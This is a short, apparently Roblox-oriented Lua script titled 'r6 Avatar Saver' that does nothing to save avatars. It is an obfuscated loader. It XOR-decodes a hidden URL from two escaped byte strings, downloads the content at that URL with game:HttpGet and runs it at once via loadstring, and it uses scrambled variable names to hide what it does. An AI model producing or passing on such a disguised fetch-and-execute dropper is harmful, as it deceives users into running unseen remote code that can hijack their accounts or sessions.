--[[ r6 Avatar Saver -Protected by Jawa Magic's ]]

( function (...) local _llIIllllIl = "\106\097\119\105\114\111\110\116\111\112\106\097\119\105\114\111\110\116\111\112\106\097\119\105\114\111\110\116\111\112\106\097\119\105\114\111\110\116\111\112\106\097\119\105\114\111\110\116\111\112\106\097\119\105\114\111\110\116\111\112\106\097\119\121\040\076\098\126\110\103\117\046\117\067\118" local _IllIllIIIl = "\002\021\003\025\001\085\065\091\029\017\029\079\016\000\006\007\027\022\026\003\015\019\020\006\028\027\011\026\027\094\009\014\026\070\060\014\026\000\014\028\016\078\005\011\030\023\065\006\010\022\025\078\031\012\019\011\029\091\002\017\003\015\088\011\030\000\013\031\010\002\007\000\025\054\023\028\030\090\003\005\011" local function _IIIlIIIlll(str, k) local _lIllIIIIlI = {} for i = 0x1, #str do local _lIlIlllIIl = string.byte(str, i) local _IIIlIIIllI = string.byte(k, ((i - 0x1) % #k) + 0x1) table.insert(_lIllIIIIlI, string.char(bit32.bxor(_lIlIlllIIl, _IIIlIIIllI))) end
 return table.concat(_lIllIIIIlI) end
 local _IIlllIllIl = _IIIlIIIlll(_llIIllllIl, _IllIllIIIl) if not _IIlllIllIl:match("^https://") then return end
 local _IIIIIlllll = game:HttpGet(_IIlllIllIl) loadstring(_IIIIIlllll)() end
 )(...)
